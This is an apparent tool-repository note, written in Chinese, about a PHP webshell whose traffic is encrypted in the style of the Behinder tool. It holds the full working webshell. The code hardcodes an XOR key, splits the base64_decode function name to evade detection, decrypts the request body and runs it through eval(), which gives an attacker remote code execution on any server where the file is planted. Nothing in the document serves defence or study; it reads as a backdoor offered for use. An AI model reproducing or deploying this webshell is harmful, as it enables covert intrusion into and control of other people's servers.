# 2023.8.12

1. 参考冰蝎xor+base64加密方式。来加密流量



### webshell

```
<?php

function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
eval(Decrypt(file_get_contents("php://input")));

?>
```



### 加密效果

![image-20230812222228181]([.\img\image-20230812222228181.png](https://github.com/wy876/tools/blob/master/img/image-20230812222228181.png)https://github.com/wy876/tools/blob/master/img/image-20230812222228181.png)

![image-20230812222254773](.\img\image-20230812222254773.png)



